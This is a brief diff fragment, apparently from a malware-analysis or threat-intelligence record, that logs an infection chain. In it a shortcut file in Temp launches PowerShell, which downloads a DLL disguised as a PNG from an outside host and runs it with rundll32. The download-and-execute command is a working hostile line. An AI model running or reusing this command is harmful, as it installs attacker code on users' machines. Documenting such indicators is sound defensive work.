@@ -14,7 +14,7 @@ cmd /c C:\Users\Admin\AppData\Local\Temp\document968.lnk
 
 powershell.exe" -NoExit iwr -Uri https://news-wellness.com/5MVhfo8BnDub/D.png -OutFile $env:TEMP\test.dll;Start-Process rundll32.exe $env:TEMP\test.dll,jhbvygftr
 
-"C:\Windows\system32\rundll32.exe" C:\Users\Admin\AppData\Local\Temp\test.dll jhbvygftr 
+rundll32.exe" C:\Users\Admin\AppData\Local\Temp\test.dll jhbvygftr 
 
 *************************************************
 
